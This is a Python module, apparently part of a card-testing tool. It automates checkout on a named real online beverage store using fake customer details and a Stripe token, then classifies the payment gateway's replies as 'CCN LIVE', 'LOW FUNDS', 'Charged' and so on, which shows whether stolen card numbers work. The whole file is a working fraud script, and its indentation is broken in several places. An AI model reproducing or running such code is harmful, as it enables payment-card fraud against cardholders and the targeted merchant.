import os
from .rand_user import random_user_api
from ..filters.checker_defs import find_between, remove_html_tags



def one(r):
    a = r.get('https://peninsulabeverageco.com.au/product/capi-sodawater750ml/')
    if a.status_code != 200: return False
    b_data = """------WebKitFormBoundarycfOSMx3s2bLFkZOH
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundarycfOSMx3s2bLFkZOH
Content-Disposition: form-data; name="add-to-cart"

3541
------WebKitFormBoundarycfOSMx3s2bLFkZOH--"""

        b_head = {
    'authority': 'peninsulabeverageco.com.au',
    'method': 'POST',
    'path': '/product/capi-sodawater750ml/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'cache-control': 'max-age=0',
    'content-length': '242',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarycfOSMx3s2bLFkZOH',
    'dnt': '1',
    'origin': 'https://peninsulabeverageco.com.au',
    'referer': 'https://peninsulabeverageco.com.au/product/capi-sodawater750ml/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    }

    b = r.post('https://peninsulabeverageco.com.au/product/capi-sodawater750ml/', data= b_data, headers = b_head)
    if b.status_code != 200: return False
    c = r.get('https://peninsulabeverageco.com.au/cart/')
    if c.status_code != 200: return False
    d = r.get('https://peninsulabeverageco.com.au/checkout/')
    if d.status_code != 200: return False
    nonce = find_between(d.text, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"')
    update_nonce = find_between(d.text, '"update_order_review_nonce":"','"')
    return (nonce, update_nonce) if True else False



def two(r, nonce, update_nonce, rand_user,token):
    e_data = {
        'security': update_nonce,
        'payment_method': 'paypal',
        'country': 'AU',
        'state': 'NT',
        'postcode': '10002',
        'city': 'New York',
        'address': '3 allen street',
        'address_2': '',
        's_country': 'AU',
        's_state': 'NT',
        's_postcode': '10002',
        's_city': 'New York',
        's_address': '3 allen street',
        's_address_2': '',
        'has_full_address': 'true',
        'post_data': f'billing_first_name={rand_user.first_name}&billing_last_name={rand_user.last_name}&billing_company=&billing_country=AU&billing_address_1=3%20allen%20street&billing_address_2=&billing_city=New%20York&billing_state=NT&billing_postcode=10002&billing_phone={str(rand_user.phone)}&billing_email={rand_user.email}&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=VIC&shipping_postcode=&order_comments=&e977f15=no&shipping_method%5B0%5D=flat_rate%3A8&payment_method=paypal&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
        'shipping_method[0]': 'flat_rate:8',
    }

        e_head = {
    'authority': 'peninsulabeverageco.com.au',
    'method': 'POST',
    'path': '/?wc-ajax=update_order_review',
    'scheme': 'https',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-length': '1057',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'dnt': '1',
    'origin': 'https://peninsulabeverageco.com.au',
    'referer': 'https://peninsulabeverageco.com.au/checkout/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    e = r.post('https://peninsulabeverageco.com.au/?wc-ajax=update_order_review', data = e_data, headers = e_head)
    if e.status_code != 200: return False
        last_data = {
    'billing_first_name': rand_user.first_name,
    'billing_last_name': rand_user.last_name,
    'billing_company': '',
    'billing_country': 'AU',
    'billing_address_1': '3 allen street',
    'billing_address_2': '',
    'billing_city': 'New York',
    'billing_state': 'NT',
    'billing_postcode': '10002',
    'billing_phone': rand_user.phone,
    'billing_email': rand_user.email,
    'shipping_first_name': '',
    'shipping_last_name': '',
    'shipping_company': '',
    'shipping_country': 'AU',
    'shipping_address_1': '',
    'shipping_address_2': '',
    'shipping_city': '',
    'shipping_state': 'VIC',
    'shipping_postcode': '',
    'order_comments': '',
    'e977f15': 'no',
    'shipping_method[0]': 'flat_rate:8',
    'payment_method': 'stripe',
    'terms': 'on',
    'terms-field': '1',
    'woocommerce-process-checkout-nonce': nonce,
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'stripe_source':token,
    }

        last_head = {
    'authority': 'peninsulabeverageco.com.au',
    'method': 'POST',
    'path': '/?wc-ajax=checkout',
    'scheme': 'https',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-length': '688',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://peninsulabeverageco.com.au',
    'referer': 'https://peninsulabeverageco.com.au/checkout/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    last = r.post('https://peninsulabeverageco.com.au/?wc-ajax=checkout', data = last_data, headers = last_head)
    return False if last.status_code != 200 else last.json()



def get_response_csa(json):
    if json['result'] == 'success':
        r_text, r_logo, r_respo = "Charged $6", "✅", 'Charged'
        return r_text, r_logo, r_respo
    text = remove_html_tags(json['messages'])
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'Rejected'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'Rejected'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'Rejected'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'Rejected'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $6", "✅", 'Charged'
    else:
            r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'Rejected'
    r_text1 = text.replace('\n','').replace('\t','') if text else r_text
    return r_text1, r_logo, r_respo